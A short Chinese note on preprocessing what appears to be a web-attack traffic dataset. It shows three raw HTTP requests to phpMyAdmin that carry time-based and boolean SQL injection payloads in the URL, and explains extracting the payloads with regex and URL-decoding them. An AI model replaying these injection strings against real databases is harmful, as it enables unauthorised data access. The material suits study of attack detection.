CSV文件举例：

```
GET /phpmyadmin/doc/html/doc/html/index.html?_nocache=1646192046225761891&ajax_page_request=true&ajax_request=if(now()=sysdate()%2Csleep(12)%2C0)&token=qC71%23Mu5PU..6Xc%2B HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://39.103.198.141:8889/
```

```
GET /phpmyadmin/doc/html/doc/html/doc/html/doc/html/doc/html/doc/html/url.php?_nocache=1646192055664179871&ajax_page_request=-1%20OR%202%2B662-662-1=0%2B0%2B0%2B1&ajax_request=true&token=qC71%23Mu5PU..6Xc%2B&url=https://www.phpmyadmin.net/ HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://39.103.198.141:8889/
Cookie: phpMyAdmin=44g66fgrm4jm2te3o286v03qme;pma_lang=sq;bf[vcode]=cfjle5;PHPSESSID=u33amsmqd714htd0ed7qlrehsr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 39.103.198.141:8889
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive


```

```
GET /phpmyadmin/doc'%20AND%202*3*8=6*8%20AND%20'A1oZ'='A1oZ/html/credits.html HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://39.103.198.141:8889/
Cookie: phpMyAdmin=i3jdm0ra7hm3a2be0eu85g3brf;pma_lang=hy;bf[vcode]=cfjle5;PHPSESSID=dnuoumefgujgq9jql17dmopqib
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 39.103.198.141:8889
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive


```

格式如上：

```
GET $payload HTTP/1.1 
无用信息
```

大部分payload都在url上

1. 可以用**正则表达式**或者py脚本将payload分离出来
2. 并将其url解码。

